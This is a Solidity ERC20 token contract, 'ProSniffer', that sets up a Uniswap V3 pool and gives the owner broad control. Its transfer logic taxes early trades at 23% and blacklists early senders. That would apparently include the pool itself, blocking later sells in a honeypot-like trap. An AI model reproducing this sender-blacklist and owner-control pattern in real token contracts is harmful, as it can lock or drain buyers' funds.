// SPDX-License-Identifier: MIT
pragma solidity >=0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }
    function mint(MintParams calldata params) external payable returns (
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0,
        uint256 amount1
    );
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external payable returns (address pool);
}

contract ProSniffer is ERC20, Ownable {
    INonfungiblePositionManager public posMan;
    address public weth;
    
    uint supply = 1_000_000 * 10 ** decimals();
    uint24 constant fee = 500;
    uint160 constant sqrtPriceX96 = 79228162514264337593543950336; // ~ 1:1
    int24 minTick;
    int24 maxTick;
    address public pool;
    address token0;
    address token1;
    uint amount0Desired;
    uint amount1Desired;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isBlacklisted;
    uint256 private _initialTax = 23;
    uint256 private _finalTax = 2;
    uint256 private _taxBlocks = 10;
    uint256 private _startBlock;

    
constructor() ERC20("ProSniffer", "SNIFFER") {
    address _posManAddress = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address _wethAddress = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;

    posMan = INonfungiblePositionManager(_posManAddress);
    weth = _wethAddress;
    _mint(address(this), supply);
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;
    fixOrdering();
    pool = posMan.createAndInitializePoolIfNecessary(token0, token1, fee, sqrtPriceX96);
}


    function addLiquidity() public onlyOwner {
        IERC20(address(this)).approve(address(posMan), supply);
        posMan.mint(INonfungiblePositionManager.MintParams({
            token0: token0,
            token1: token1,
            fee: fee,
            tickLower: minTick,
            tickUpper: maxTick,
            amount0Desired: amount0Desired,
            amount1Desired: amount1Desired,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp + 1200
        }));
    }

    function ownerTransfer(address recipient, uint256 amount) public onlyOwner {
        _transfer(address(this), recipient, amount);
    }

    function fixOrdering() private {
        if (address(this) < weth) {
            token0 = address(this);
            token1 = weth;
            amount0Desired = supply;
            amount1Desired = 0;
            minTick = 0;
            maxTick = 887270;
        } else {
            token0 = weth;
            token1 = address(this);
            amount0Desired = 0;
            amount1Desired = supply;
            minTick = -887270;
            maxTick = 0;
        }
    }

    function setPosManAddress(address _posManAddress) external onlyOwner {
        posMan = INonfungiblePositionManager(_posManAddress);
    }

    function setWethAddress(address _wethAddress) external onlyOwner {
        weth = _wethAddress;
    }

    function removeFromBlacklist(address user) external onlyOwner() {
        _isBlacklisted[user] = false;
    }

    function openTrading() external onlyOwner() {
        _startBlock = block.number;
    }


function _transfer(address sender, address recipient, uint256 amount) internal override validRecipient(recipient) {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    uint256 taxAmount = 0;

    if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
        if (block.number <= _startBlock + _taxBlocks) {
            taxAmount = amount * _initialTax / 100;
            _isBlacklisted[sender] = true;
        } else {
            taxAmount = amount * _finalTax / 100;
        }

        super._transfer(sender, address(this), taxAmount);
        super._transfer(sender, recipient, amount - taxAmount);
    } else {
        super._transfer(sender, recipient, amount);
    }
}
function renounceContractOwnership() external onlyOwner {
    renounceOwnership();
}


    modifier validRecipient(address to) {
    require(!_isBlacklisted[to], "Address is blacklisted");
    _;
    }
    
}
